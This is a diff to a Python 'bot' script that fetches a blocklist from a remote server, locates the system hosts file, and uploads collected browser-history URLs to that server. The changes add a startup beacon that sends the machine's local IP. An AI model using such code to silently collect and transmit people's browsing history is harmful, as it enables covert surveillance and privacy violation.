@@ -10,13 +10,16 @@ import time
 from datetime import datetime as dt
 from browser_history import browsers, generic, utils,core
 
-
+version = "Alpha_1.1"
 
 # POST
 def POST(type,content):
     r = requests.post(url=server,data={type:content})
     # print("POST : "+content)
-# GET HOST
+def post_info():
+     r = requests.post(url=server,data={"new_connect":get_local_ip()})
+     print(r.text)
+    # POST("new_connect",utils.get_platform_name())
 def get_hosts_path():
     plat = utils.get_platform_name()
     #LOCATE HOSTS 
@@ -27,6 +30,12 @@ def get_hosts_path():
     print("USING "+plat+" METHOD")
     return hosts_path
 #GET IP
+def get_local_ip():
+    hostname = socket.gethostname()
+    IPAddr = socket.gethostbyname(hostname)
+    return IPAddr
+
+
 def get_ip():
     r = requests.post(url=server,data={'text':'blacklist'})
     getted_ip = r.text.split('\n')
@@ -102,7 +111,7 @@ def post_url_his(se):
         # Remove duplcated
         c= list(set(a))
     for o in range(len(c)):
-        r=POST('url_p',c[o])
+        r=POST('his_p',c[o])
         #LOG
     print("HISTORY SAVED AND POSTED ", len(a) )
 
@@ -127,28 +136,20 @@ website_list = website_cloud+website_ban
 for i in range(len(website_list)):
     print("LIST :" + website_list[i])
 
-
-POST('text','BOT IS STARTED')
 # c = input("Y or N:")
-
+post_info()
 hosts_path = get_hosts_path()
 c="y"
-
-# while True:
-#     if(c == "y" or c == "Y"):
-#         for i in range(20):
-#             print(a)
-#             post_url_his(server_local)
-#             time.sleep(3)
-#             a=a+1
-#         c = input("Y or N:")
-#     if (c == "n" or c =="N"):
-#         break
-
 while True:
     if(c == "y" or c == "Y"):
-        post_url_his(server_local)
         break
     if (c == "n" or c =="N"):
         break
+
+# while True:
+#     if(c == "y" or c == "Y"):
+#         post_url_his(server_local)
+#         break
+#     if (c == "n" or c =="N"):
+#         break
 
